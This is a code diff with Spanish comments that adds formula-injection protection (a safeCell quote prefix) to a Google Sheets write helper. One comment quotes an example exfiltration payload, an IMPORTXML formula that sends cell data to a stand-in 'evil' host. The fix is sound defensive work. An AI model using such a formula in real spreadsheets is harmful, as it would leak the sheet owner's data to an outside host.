@@ -158,11 +158,23 @@ async function ensureHeaders(token: string, id: string, tab: string, keys: strin
   return headers;
 }
 
+// 🛡️ Anti-inyección de fórmulas: las filas de datos se escriben con USER_ENTERED (para
+// que el monto entre como número, no texto), pero eso hace que Sheets EVALÚE cualquier
+// celda que empiece con = + - @ (o tab/CR). Como "Cliente", "Dirección", etc. son texto
+// LIBRE del cliente, un nombre de perfil tipo =IMPORTXML("https://evil/?d="&C2,"//a") se
+// ejecutaría en la hoja del dueño y exfiltraría su base. Se antepone ' para que Sheets lo
+// trate como texto literal. Un monto positivo ("120.00") no empieza con esos chars → sigue
+// entrando como número; un teléfono "+51..." queda como texto (correcto, no se suma).
+function safeCell(v: unknown): string {
+  const s = String(v ?? "");
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 // Alinea la fila a los encabezados REALES, casando sin distinguir mayúsculas.
 function alinear(headers: string[], fila: Record<string, string>): string[] {
   const porClave = new Map<string, string>();
   for (const [k, v] of Object.entries(fila)) porClave.set(norm(k), v);
-  return headers.map((h) => porClave.get(norm(h)) ?? "");
+  return headers.map((h) => safeCell(porClave.get(norm(h)) ?? ""));
 }
 
 // Índice de una columna, casando sin distinguir mayúsculas ("CEL" == "Cel").
@@ -196,7 +208,7 @@ export async function sheetsUpdate(token: string, id: string, tab: string | unde
   }
   if (foundRow < 0) { await sheetsAppend(token, id, t, { ...buscar, ...fila }); return; }
   const data = Object.keys(fila)
-    .map((k) => ({ ci: idxDe(headers, k), v: fila[k] }))
+    .map((k) => ({ ci: idxDe(headers, k), v: safeCell(fila[k]) }))
     .filter((x) => x.ci >= 0)
     .map((x) => ({ range: `${t}!${colA1(x.ci)}${foundRow}`, values: [[x.v]] }));
   if (data.length) await api(token, `${SHEETS}/${id}/values:batchUpdate`, "POST", { valueInputOption: "USER_ENTERED", data });
